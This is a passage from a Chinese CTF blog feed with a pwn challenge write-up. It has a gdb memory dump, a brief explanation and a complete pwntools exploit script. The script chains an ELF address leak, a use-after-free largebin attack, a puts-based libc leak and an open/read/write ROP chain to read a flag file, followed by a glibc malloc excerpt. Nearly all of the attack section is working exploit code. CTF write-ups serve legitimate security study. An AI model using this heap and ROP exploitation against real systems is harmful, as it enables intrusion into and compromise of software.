&lt;stdin@@GLIBC_2.2.5&gt;:\t0x00007ffff7e1aaa0\t0x0000000000000000<br>\n0x555555558040 &lt;stderr@@GLIBC_2.2.5&gt;:\t0x00007ffff7e1b6a0\t0x0000000000000000<br>\n0x555555558050 <book>:\t0x000055555555d5d1\t0x0000000000000000<br>\n0x555555558060 <p>:\t0x000055555555d0c0\t0x000055555555d5a0<br>\n0x555555558070 &lt;p+16&gt;:\t0x000055555555d5e0\t0x000055555555daa0<br>\n0x555555558080 &lt;p+32&gt;:\t0x000055555555dfb0\t0x000055555555cfb0<br>\n0x555555558090 &lt;p+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580a0 &lt;p+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580b0 &lt;p+80&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x5555555580c0 &lt;p+96&gt;:\t0x0000000000000000\t0x0000000000000000</p>\n</blockquote>\n<p>可见那个数字修改成 <code>0x000055555555d5d1</code> ，为啥后面会多个 1，不用问，他的代码就是 <code>book++</code></p>\n<p>之后就是 edit 哪里的栈溢出攻击</p>\n<h4 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> EXP</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> Delllim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>Delllim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> Delllim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>Delllim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> Delllims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>Delllims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> Delllims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>Delllims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>paddding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'give you a gift: 0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>elfbase <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x4010</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'elfbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    meau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"How many pages does your book need?\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Del</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>y <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>id1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>ct <span class=\"token operator\">=</span> <span class=\"token string\">b''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    meau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"o delete?\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">if</span> y<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"being deleted?(y/n)\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"which page do you want to write?\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>id1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"content: \\n\"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"being deleted?(y/n)\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Edi</span><span class=\"token punctuation\">(</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    meau<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"come on,Write down your story!\\n\"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>rdi <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> <span class=\"token number\">0x1863</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>rsi <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> <span class=\"token number\">0x1861</span> <span class=\"token comment\"># pop rsi r15 ret</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>bss <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> <span class=\"token number\">0x4110</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>edit_ret <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'edit_the_book'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>putg <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>putp <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x450</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0 chunk0</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1 chunk1</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x440</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2 chunk2</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#  chunk0 進入 unsortedbin</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0 chunk3 chunk1 進入 largebin    </span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>book <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> <span class=\"token number\">0x4050</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>book <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 釋放 chunk2, 進入 unsortedbin 內，同時 uaf 修改 chunk0 的 bk 指針，指向目的地址</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>debug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># &lt;large bin attack>,chunk2 插入 largebin 內，同時覆蓋地址 chunk1->bknextsize->fdnextsize 指向 chunk2</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>pay <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>paddding<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdi<span class=\"token punctuation\">,</span> putg<span class=\"token punctuation\">,</span> putp<span class=\"token punctuation\">,</span> edit_ret<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>Edi<span class=\"token punctuation\">(</span>flat<span class=\"token punctuation\">(</span>pay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>libcbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>rax <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x45eb0</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>rdx <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x904a9</span> <span class=\"token comment\">#pop rdx; pop rbx; ret; </span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>rsi <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x16333a</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>pay <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    paddding<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> bss<span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> bss<span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> bss<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> bss<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> write_addr</pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'come on,Write down your story!\\n'</span><span class=\"token punctuation\">,</span>pay<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>se<span class=\"token punctuation\">(</span><span class=\"token string\">b'./flag\\x00\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token function\">chunksize_nomask</span> <span class=\"token punctuation\">(</span>bck<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    fwd <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    bck <span class=\"token operator\">=</span> bck<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    victim<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    victim<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>fd<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    fwd<span class=\"token operator\">-></span>fd<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> victim<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "Game"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/",
